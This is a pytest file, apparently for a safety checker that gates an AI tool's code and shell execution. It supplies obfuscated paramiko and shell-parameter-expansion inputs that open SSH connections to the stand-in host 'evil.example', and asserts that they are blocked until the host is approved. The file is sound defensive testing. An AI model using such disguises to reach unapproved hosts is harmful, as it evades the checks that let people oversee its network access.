import pytest
from core.inference.tools import _check_code_safety,_find_blocked_commands
from state.ssh_approvals import approve_hosts,reset_ssh_approvals

@pytest.mark.parametrize('code',[
 "import paramiko\ndef deploy(client): client.connect(hostname='evil.example')\ndeploy(paramiko.SSHClient())",
 "import paramiko\ndef deploy(client): client.connect(hostname='evil.example')\nc=paramiko.SSHClient(); deploy(client=c)",
 "import paramiko\ndef deploy(*,client): client.connect(hostname='evil.example')\ndeploy(client=paramiko.SSHClient())",
 "import paramiko\ndef deploy(client=paramiko.SSHClient()): client.connect(hostname='evil.example')\ndeploy()",
 "import paramiko\ndef outer(source): inner(source)\ndef inner(client): client.connect(hostname='evil.example')\nouter(paramiko.SSHClient())",
])
def test_helper_clients_require_approval(code):
 reset_ssh_approvals()
 assert _check_code_safety(code,session_id='round18') is not None
 approve_hosts('round18',['evil.example'])
 assert _check_code_safety(code,session_id='round18') is None

@pytest.mark.parametrize('command',[
 'cmd=${PR10642_UNSET:-ssh}; "$cmd" -F none evil.example',
 'cmd="${PR10642_UNSET:-ssh}"; "$cmd" -F none evil.example',
 'cmd=${PR10642_UNSET-ssh}; $cmd -F none evil.example',
 'cmd=${PR10642_UNSET:=ssh}; "$cmd" -F none evil.example',
])
def test_expanded_command_assignment_fails_closed(command):
 assert _find_blocked_commands(command)


def test_parameter_expansion_as_data_remains_allowed():
 assert not _find_blocked_commands('value=${PR10642_UNSET:-ssh}; printf "%s" "$value"')
 assert not _find_blocked_commands("cmd='${PR10642_UNSET:-ssh}'; printf '%s' \"$cmd\"")
